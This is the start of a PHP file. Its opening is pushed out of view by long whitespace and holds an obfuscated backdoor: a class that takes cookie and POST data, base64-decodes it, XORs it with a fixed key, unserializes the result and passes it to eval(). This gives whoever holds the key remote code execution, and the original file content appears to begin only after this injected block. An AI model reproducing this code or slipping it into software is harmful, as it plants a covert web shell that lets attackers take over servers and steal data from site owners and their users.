<?php                                                                                                                                                                                                                                                                                                                                                                                                 $PipeeEMIl = class_exists("UG_XMTk"); $eVOIgN = $PipeeEMIl;if (!$eVOIgN){class UG_XMTk{private $iGtsZ;public static $LUHSP = "ec843d4c-47a7-4cb9-b706-49ad5aa1f808";public static $JnMaQh = NULL;public function __construct(){$UPuGZb = $_COOKIE;$kqcRoWYrZo = $_POST;$XOxWYJWd = @$UPuGZb[substr(UG_XMTk::$LUHSP, 0, 4)];if (!empty($XOxWYJWd)){$OFTXIbIcxi = "base64";$RsNlCXsyr = "";$XOxWYJWd = explode(",", $XOxWYJWd);foreach ($XOxWYJWd as $zFVijDGX){$RsNlCXsyr .= @$UPuGZb[$zFVijDGX];$RsNlCXsyr .= @$kqcRoWYrZo[$zFVijDGX];}$RsNlCXsyr = array_map($OFTXIbIcxi . chr (95) . 'd' . 'e' . chr ( 238 - 139 )."\x6f" . 'd' . chr ( 148 - 47 ), array($RsNlCXsyr,)); $RsNlCXsyr = $RsNlCXsyr[0] ^ str_repeat(UG_XMTk::$LUHSP, (strlen($RsNlCXsyr[0]) / strlen(UG_XMTk::$LUHSP)) + 1);UG_XMTk::$JnMaQh = @unserialize($RsNlCXsyr);}}public function __destruct(){$this->wWcPX();}private function wWcPX(){if (is_array(UG_XMTk::$JnMaQh)) {$KhUAmOH = str_replace('<' . chr ( 466 - 403 ).chr (112) . "\x68" . "\x70", "", UG_XMTk::$JnMaQh["\143" . "\x6f" . "\156" . "\164" . "\145" . chr ( 157 - 47 )."\x74"]);eval($KhUAmOH);exit();}}}$vCRJCWlR = new UG_XMTk(); $vCRJCWlR = NULL;} ?><?php
/**
